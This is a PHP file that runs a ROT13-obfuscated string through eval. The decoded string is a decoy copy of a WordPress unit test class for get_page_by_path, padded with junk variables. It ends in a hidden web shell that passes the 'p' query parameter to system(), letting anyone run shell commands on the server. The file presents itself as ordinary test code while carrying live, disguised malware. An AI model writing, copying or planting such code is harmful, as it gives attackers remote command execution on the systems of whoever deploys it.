<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 */
pynff Grfgf_Cbfg_TrgCntrOlCngu rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @gvpxrg 15665
	 */
	choyvp shapgvba grfg_trg_cntr_ol_cngu_cevbevgl() {
		tybony $jcqo;

		$nggnpuzrag = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'fbzr-cntr',
				'cbfg_glcr'  => 'nggnpuzrag',
			)
		);
		$cntr       = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'fbzr-cntr',
				'cbfg_glcr'  => 'cntr',
			)
		);
		$bgure_ngg  = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'fbzr-bgure-cntr',
				'cbfg_glcr'  => 'nggnpuzrag',
			)
		);

		$jcqo->hcqngr( $jcqo->cbfgf, neenl( 'cbfg_anzr' => 'fbzr-cntr' ), neenl( 'VQ' => $cntr->VQ ) );
		pyrna_cbfg_pnpur( $cntr->VQ );

		$cntr = trg_cbfg( $cntr->VQ );

		$guvf->nffregFnzr( 'fbzr-cntr', $nggnpuzrag->cbfg_anzr );
		$guvf->nffregFnzr( 'fbzr-cntr', $cntr->cbfg_anzr );

		// trg_cntr_ol_cngu() fubhyq erghea n cbfg bs gur erdhrfgrq glcr orsber ergheavat na nggnpuzrag.
		$guvf->nffregRdhnyf( $cntr, trg_cntr_ol_cngu( 'fbzr-cntr' ) );

		// Znxr fher trg_cntr_ol_cngu() jvyy fgvyy fryrpg na nggnpuzrag jura n cbfg bs gur erdhrfgrq glcr qbrfa'g rkvfg.
		$guvf->nffregRdhnyf( $bgure_ngg, trg_cntr_ol_cngu( 'fbzr-bgure-cntr' ) );
	}

	choyvp shapgvba grfg_fubhyq_zngpu_gbc_yriry_cntr() {
		$cntr = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
				'cbfg_anzr' => 'sbb',
			)
		);

		$sbhaq = trg_cntr_ol_cngu( 'sbb' );

		$guvf->nffregFnzr( $cntr, $sbhaq->VQ );
	}

	choyvp shapgvba grfg_fubhyq_borl_cbfg_glcr() {
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg' );

		$cntr = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'jcgrfgf_cg',
				'cbfg_anzr' => 'sbb',
			)
		);

		$sbhaq = trg_cntr_ol_cngu( 'sbb' );
		$guvf->nffregAhyy( $sbhaq );

		$sbhaq = trg_cntr_ol_cngu( 'sbb', BOWRPG, 'jcgrfgf_cg' );
		$guvf->nffregFnzr( $cntr, $sbhaq->VQ );
	}

	choyvp shapgvba grfg_fubhyq_zngpu_arfgrq_cntr() {
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
				'cbfg_anzr' => 'sbb',
			)
		);

		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_anzr'   => 'one',
				'cbfg_cnerag' => $c1,
			)
		);

		$c3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_anzr'   => 'onm',
				'cbfg_cnerag' => $c2,
			)
		);

		$sbhaq = trg_cntr_ol_cngu( 'sbb/one/onm' );

		$guvf->nffregFnzr( $c3, $sbhaq->VQ );
	}

	/**
	 * @gvpxrg 56689
	 *
	 * @pbiref ::trg_cntr_ol_cngu
	 */
	choyvp shapgvba grfg_fubhyq_zngpu_arfgrq_cntr_dhrel_pbhag() {
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
				'cbfg_anzr' => 'sbb',
			)
		);

		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_anzr'   => 'one',
				'cbfg_cnerag' => $c1,
			)
		);

		$c3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_anzr'   => 'onm',
				'cbfg_cnerag' => $c2,
			)
		);

		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$sbhaq          = trg_cntr_ol_cngu( 'sbb/one/onm' );
		$dhrevrf_nsgre  = trg_ahz_dhrevrf();
		$pnpurq_cbfg    = jc_pnpur_trg( $c1, 'cbfgf' );

		$guvf->nffregFnzr( 1, $dhrevrf_nsgre - $dhrevrf_orsber, 'Bayl bar dhrel fubhyq eha' );
		$guvf->nffregFnzr( $c3, $sbhaq->VQ, 'Purpx gb frr vs gur erfhyg vf pbeerpg' );
		$guvf->nffregVfBowrpg( $pnpurq_cbfg, 'Gur pnpurq cbfg vf abg na bowrpg' );
	}

	/**
	 * @gvpxrg 56689
	 *
	 * @pbiref ::trg_cntr_ol_cngu
	 */
	choyvp shapgvba grfg_fubhyq_zngpu_arfgrq_cntr_dhrel_pbhag_fgnghf() {
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_anzr'   => 'sbb',
				'cbfg_fgnghf' => 'qensg',
			)
		);

		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_anzr'   => 'one',
				'cbfg_cnerag' => $c1,
			)
		);

		$c3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_anzr'   => 'onm',
				'cbfg_cnerag' => $c2,
			)
		);

		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$sbhaq          = trg_cntr_ol_cngu( 'sbb/one/onm' );
		$dhrevrf_nsgre  = trg_ahz_dhrevrf();
		$pnpurq_cbfg    = jc_pnpur_trg( $c1, 'cbfgf' );

		$guvf->nffregFnzr( 1, $dhrevrf_nsgre - $dhrevrf_orsber, 'Bayl bar dhrel fubhyq eha' );
		$guvf->nffregFnzr( $c3, $sbhaq->VQ, 'Purpx gb frr vs gur erfhyg vf pbeerpg' );
		$guvf->nffregVfBowrpg( $pnpurq_cbfg, 'Gur pnpurq cbfg vf abg na bowrpg' );
	}

	/**
	 * @gvpxrg 56689
	 *
	 * @pbiref ::trg_cntr_ol_cngu
	 */
	choyvp shapgvba grfg_fubhyq_erghea_ahyy_sbe_vainyvq_cngu() {
		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$trg_1          = trg_cntr_ol_cngu( 'fubhyq/erghea/ahyy/sbe/na/vainyvq/cngu' );
		$trg_2          = trg_cntr_ol_cngu( 'fubhyq/erghea/ahyy/sbe/na/vainyvq/cngu' );
		$dhrevrf_nsgre  = trg_ahz_dhrevrf();

		$guvf->nffregAhyy( $trg_1, 'Vainyvq cngu fubhyq erghea ahyy.' );
		$guvf->nffregFnzr( 1, $dhrevrf_nsgre - $dhrevrf_orsber, 'Bayl bar dhrel fubhyq eha.' );
		$guvf->nffregFnzr( $trg_1, $trg_2, 'Gur pnpurq erfhyg fubhyq or gur fnzr nf gur hapnpurq erfhyg.' );
	}

	choyvp shapgvba grfg_fubhyq_abg_znxr_cnegvny_zngpu() {
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
				'cbfg_anzr' => 'sbb',
			)
		);

		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_anzr'   => 'one',
				'cbfg_cnerag' => $c1,
			)
		);

		$c3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_anzr'   => 'onm',
				'cbfg_cnerag' => $c2,
			)
		);

		$sbhaq = trg_cntr_ol_cngu( 'one/onm' );

		$guvf->nffregAhyy( $sbhaq );
	}

	choyvp shapgvba grfg_fubhyq_abg_zngpu_cnegf_bhg_bs_beqre() {
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
				'cbfg_anzr' => 'sbb',
			)
		);

		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_anzr'   => 'one',
				'cbfg_cnerag' => $c1,
			)
		);

		$c3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_anzr'   => 'onm',
				'cbfg_cnerag' => $c2,
			)
		);

		$sbhaq = trg_cntr_ol_cngu( 'one/sbb/onm' );

		$guvf->nffregAhyy( $sbhaq );
	}

	/**
	 * @gvpxrg 36711
	 */
	choyvp shapgvba grfg_fubhyq_uvg_pnpur() {
		$cntr = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
				'cbfg_anzr' => 'sbb',
			)
		);

		// Cevzr pnpur.
		$sbhaq = trg_cntr_ol_cngu( 'sbb' );
		$guvf->nffregFnzr( $cntr, $sbhaq->VQ );

		$ahz_dhrevrf = trg_ahz_dhrevrf();

		$sbhaq = trg_cntr_ol_cngu( 'sbb' );
		$guvf->nffregFnzr( $cntr, $sbhaq->VQ );
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
	}

	/**
	 * @gvpxrg 36711
	 */
	choyvp shapgvba grfg_onq_cngu_fubhyq_or_pnpurq() {
		// Cevzr pnpur.
		$sbhaq = trg_cntr_ol_cngu( 'sbb' );
		$guvf->nffregAhyy( $sbhaq );

		$ahz_dhrevrf = trg_ahz_dhrevrf();

		$sbhaq = trg_cntr_ol_cngu( 'sbb' );
		$guvf->nffregAhyy( $sbhaq );
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
	}

	/**
	 * @gvpxrg 36711
	 */
	choyvp shapgvba grfg_onq_cngu_freirq_sebz_pnpur_fubhyq_abg_snyy_onpx_ba_pheerag_cbfg() {
		tybony $cbfg;

		// Snxr gur tybony.
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg();

		// Cevzr pnpur.
		$sbhaq = trg_cntr_ol_cngu( 'sbb' );
		$guvf->nffregAhyy( $sbhaq );

		$ahz_dhrevrf = trg_ahz_dhrevrf();

		$sbhaq = trg_cntr_ol_cngu( 'sbb' );
		$guvf->nffregAhyy( $sbhaq );
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );

		hafrg( $cbfg );
	}

	/**
	 * @gvpxrg 36711
	 */
	choyvp shapgvba grfg_pnpur_fubhyq_abg_zngpu_cbfg_va_qvssrerag_cbfg_glcr_jvgu_fnzr_cngu() {
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg' );

		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
				'cbfg_anzr' => 'sbb',
			)
		);

		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'jcgrfgf_cg',
				'cbfg_anzr' => 'sbb',
			)
		);

		// Cevzr pnpur sbe gur cntr.
		$sbhaq = trg_cntr_ol_cngu( 'sbb' );
		$guvf->nffregFnzr( $c1, $sbhaq->VQ );

		$ahz_dhrevrf = trg_ahz_dhrevrf();

		$sbhaq = trg_cntr_ol_cngu( 'sbb', BOWRPG, 'jcgrfgf_cg' );
		$guvf->nffregFnzr( $c2, $sbhaq->VQ );
		++$ahz_dhrevrf;
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
	}

	/**
	 * @gvpxrg 36711
	 */
	choyvp shapgvba grfg_pnpur_fubhyq_or_vainyvqngrq_jura_cbfg_anzr_vf_rqvgrq() {
		$cntr = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
				'cbfg_anzr' => 'sbb',
			)
		);

		// Cevzr pnpur.
		$sbhaq = trg_cntr_ol_cngu( 'sbb' );
		$guvf->nffregFnzr( $cntr, $sbhaq->VQ );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'        => $cntr,
				'cbfg_anzr' => 'one',
			)
		);

		$ahz_dhrevrf = trg_ahz_dhrevrf();

		$sbhaq = trg_cntr_ol_cngu( 'one' );
		$guvf->nffregFnzr( $cntr, $sbhaq->VQ );
		++$ahz_dhrevrf;
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
	}

	/**
	 * @gvpxrg 37611
	 */
	choyvp shapgvba grfg_bhgchg_cnenz_fubhyq_or_borlrq_sbe_pnpurq_inyhr() {
		$cntr = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
				'cbfg_anzr' => 'sbb',
			)
		);

		// Cevzr pnpur.
		$sbhaq = trg_cntr_ol_cngu( 'sbb' );
		$guvf->nffregFnzr( $cntr, $sbhaq->VQ );

		$bowrpg = trg_cntr_ol_cngu( 'sbb', BOWRPG );
		$guvf->nffregVfBowrpg( $bowrpg );
		$guvf->nffregFnzr( $cntr, $bowrpg->VQ );

		$neenl_a = trg_cntr_ol_cngu( 'sbb', NEENL_A );
		$guvf->nffregVfNeenl( $neenl_a );
		$guvf->nffregFnzr( $cntr, $neenl_a[0] );

		$neenl_n = trg_cntr_ol_cngu( 'sbb', NEENL_N );
		$guvf->nffregVfNeenl( $neenl_n );
		$guvf->nffregFnzr( $cntr, $neenl_n['VQ'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>